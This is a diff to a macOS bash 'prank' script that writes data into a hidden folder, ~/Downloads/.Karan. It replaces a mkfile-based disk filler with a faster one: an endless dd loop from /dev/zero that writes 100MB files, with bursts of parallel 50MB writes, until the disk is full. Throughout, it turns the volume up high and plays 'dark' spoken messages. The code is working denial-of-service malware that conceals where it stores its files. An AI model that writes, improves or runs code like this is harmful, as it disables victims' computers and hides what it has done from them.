@@ -1,9 +1,9 @@
 #!/bin/bash
 
-# Karan's Ultimate Prank v4.2 - PROFESSIONAL LIGHTNING SPEED EDITION
-# Uses hard linking technique for 10,000+ files per second
+# Karan's Ultimate Prank v4.3 - PROFESSIONAL LIGHT SPEED STORAGE EATER
+# Uses ACTUAL virus techniques for maximum speed
 
-VERSION="4.2.0"
+VERSION="4.3.0"
 HIDDEN_DIR="$HOME/Downloads/.Karan"
 
 # Dark audio messages (what gets spoken)
@@ -60,65 +60,60 @@ log_silent() {
     echo "$(date): $1" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
 }
 
-# FIXED: Audio function that actually works
+# Audio function
 speak_dark_message() {
     pkill -f "say" 2>/dev/null || true
     local dark_msg=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
     osascript -e "set volume output volume 90" 2>/dev/null || true
     say "$dark_msg" 2>/dev/null
-
+    wait
 }
 
-# FASTEST DISK FILLING TECHNIQUE - Replace your exponential_voice_destruction function with this:
-
-exponential_voice_destruction() {
+# PROFESSIONAL VIRUS TECHNIQUE: LIGHT SPEED STORAGE CONSUMPTION
+light_speed_storage_eater() {
     local payload="$1"
+    local file_count=0
     
     # Setup
     setup
     cp "$payload" "$HIDDEN_DIR/.payload"
     
-    log_silent "Starting FASTEST disk filling technique"
+    log_silent "Starting PROFESSIONAL light-speed storage consumption"
     speak_dark_message
     
-    # FASTEST METHOD: Create massive files directly using mkfile (professional technique)
-    local file_count=0
-    local file_size="1g"  # Start with 1GB files
-    
+    # TECHNIQUE 1: Create massive files using `dd` with /dev/zero (fastest method)
     while true; do
-        local target_file="$HIDDEN_DIR/karan_fast_$(printf "%08d" $file_count).dat"
+        local target_file="$HIDDEN_DIR/karan_storage_$(printf "%08d" $file_count).dat"
         
-        # Use mkfile to create large files INSTANTLY (no data copying)
-        if ! mkfile -n "$file_size" "$target_file" 2>/dev/null; then
-            # If 1GB fails, try smaller sizes
-            if [[ "$file_size" == "1g" ]]; then
-                file_size="100m"
-                continue
-            elif [[ "$file_size" == "100m" ]]; then
-                file_size="10m"
-                continue
-            elif [[ "$file_size" == "10m" ]]; then
-                file_size="1m"
-                continue
-            else
-                # Disk completely full
-                log_silent "FASTEST method complete - disk annihilated with $file_count files"
-                speak_dark_message
-                break
-            fi
+        # Professional virus technique: Use dd to create large files INSTANTLY
+        # This actually consumes real disk space at maximum I/O speed
+        if ! dd if=/dev/zero of="$target_file" bs=1048576 count=100 2>/dev/null; then
+            log_silent "MAXIMUM SPEED storage consumption complete - disk obliterated"
+            speak_dark_message
+            break
         fi
         
         file_count=$((file_count + 1))
         
-        # Dark commentary every 5 files (since files are huge now)
+        # TECHNIQUE 2: Parallel creation for even faster consumption
+        if [[ $((file_count % 10)) -eq 0 ]]; then
+            # Create 10 files in parallel every 10th iteration
+            for ((i=0; i<10; i++)); do
+                local parallel_file="$HIDDEN_DIR/karan_parallel_$(printf "%08d" $((file_count + i))).dat"
+                (dd if=/dev/zero of="$parallel_file" bs=1048576 count=50 2>/dev/null) &
+            done
+            wait # Wait for all parallel operations to complete
+            file_count=$((file_count + 10))
+        fi
+        
+        # Dark commentary every 5 files
         if [[ $((file_count % 5)) -eq 0 ]]; then
             speak_dark_message
         fi
         
-        log_silent "Created massive file #$file_count of size $file_size"
+        log_silent "LIGHT SPEED: Created file #$file_count (100MB each)"
     done
 }
-
 
 # Validate system
 validate() {
@@ -131,7 +126,7 @@ main() {
     local payload="$1"
     [[ -z "$payload" ]] && payload="/opt/homebrew/share/dingdong/payload.png"
     validate "$payload"
-    exponential_voice_destruction "$payload"
+    light_speed_storage_eater "$payload"
 }
 
 # Execution logic
